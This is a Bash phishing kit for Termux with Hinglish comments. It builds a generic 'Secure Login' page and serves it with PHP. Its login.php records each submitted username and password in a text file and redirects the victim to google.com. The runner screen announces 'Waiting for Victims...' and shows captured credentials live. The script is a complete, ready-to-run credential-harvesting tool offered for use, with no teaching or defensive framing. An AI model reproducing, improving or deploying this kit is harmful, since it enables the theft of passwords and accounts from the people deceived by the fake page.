#!/bin/bash

# --- 1. AUTOMATIC SETUP & INSTALLER (Ye Khud Run Hoga) ---
# Hum check karenge ki PHP aur PROOT install hai ya nahi.
# Agar nahi hai, to ye script automatic install kar degi.
echo -e "\033[1;33m[*] Checking System Requirements...\033[0m"

packages=("php" "proot" "wget" "curl")

for pkg in "${packages[@]}"; do
    if ! command -v $pkg &> /dev/null; then
        echo -e "\033[1;31m[!] $pkg not found! Installing automatically...\033[0m"
        pkg install $pkg -y > /dev/null 2>&1
    fi
done

# --- 2. CLEANUP & PREPARE ---
# Purana server band aur naya folder setup
pkill -f php > /dev/null 2>&1
rm -rf auth/
mkdir -p auth

# --- 3. CREATE PREMIUM LOGIN PAGE (Automatic Page Generation) ---
# Ye code ek Professional Dark Login Page banayega
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body {
            margin: 0; padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #121212;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background-color: #1e1e1e;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            width: 300px;
            text-align: center;
            border: 1px solid #333;
        }
        h2 { margin-bottom: 20px; color: #00ff88; letter-spacing: 1px; }
        input {
            width: 90%; padding: 12px; margin: 10px 0;
            background: #2c2c2c; border: 1px solid #444;
            color: white; border-radius: 5px; outline: none;
        }
        input:focus { border-color: #00ff88; }
        button {
            width: 100%; padding: 12px; margin-top: 20px;
            background: linear-gradient(45deg, #00ff88, #00cc6a);
            border: none; color: black; font-weight: bold;
            border-radius: 5px; cursor: pointer;
            transition: 0.3s;
        }
        button:hover { opacity: 0.9; }
        .logo { font-size: 50px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">🔒</div>
        <h2>Secure Login</h2>
        <p style="color:#aaa; font-size:13px;">Please verify your identity to continue.</p>
        <form method="POST" action="login.php">
            <input type="text" name="username" placeholder="Username / Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">VERIFY</button>
        </form>
    </div>
</body>
</html>
EOF

# --- 4. CREATE CAPTURE LOGIC ---
cat > auth/login.php <<EOF
<?php
// Ye file password capture karegi aur wapas bhej degi
file_put_contents("../usernames.txt", "Account: " . \$_POST['username'] . " | Password: " . \$_POST['password'] . "\n", FILE_APPEND);
header('Location: https://google.com'); 
exit();
?>
EOF

# --- 5. THE RUNNER INTERFACE ---
GREEN='\033[1;32m'
CYAN='\033[1;36m'
GOLD='\033[1;33m'
RED='\033[1;31m'
RESET='\033[0m'

clear
echo -e "${GOLD}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║                                                      ║"
echo "║   ${CYAN}ANURAG HKR - AUTOMATED EDITION (v3.0)${GOLD}      ║"
echo "║   ${GREEN}SYSTEM STATUS: ${RED}GOD MODE (Proot Active)${GOLD}        ║"
echo "║                                                      ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${RESET}"

echo -e "${CYAN}[*] Auto-Starting PHP Server...${RESET}"

# --- 6. START SERVER (With GOD MODE) ---
# Ye 'termux-chroot' use karega taki permission error 100% fix rahe
termux-chroot php -S 127.0.0.1:8080 -t auth > /dev/null 2>&1 &
PID=$!
sleep 3

# --- 7. VERIFY & MONITOR ---
if netstat -tuln | grep ":8080" > /dev/null; then
    echo -e "${GREEN}[✔] SERVER IS ONLINE!${RESET}"
    echo -e "${CYAN}----------------------------------------${RESET}"
    echo -e "${GOLD}👉 Link: http://127.0.0.1:8080${RESET}"
    echo -e "${CYAN}----------------------------------------${RESET}"
    echo -e "${RED}[-] Press Ctrl + C to Stop${RESET}"
    echo ""
    echo -e "${GREEN}Waiting for Victims...${RESET}"
    
    # Live Monitoring
    touch usernames.txt
    tail -f usernames.txt | while read line; do
        echo -e "${RED}[+] CAPTURED: ${GOLD}$line${RESET}"
        echo -e "\a" # Beep Sound
    done
else
    echo -e "${RED}[!] ERROR: Server start nahi hua.${RESET}"
    echo -e "${GOLD}Tip: Ek baar 'exit' type karke Termux dobara kholo.${RESET}"
fi
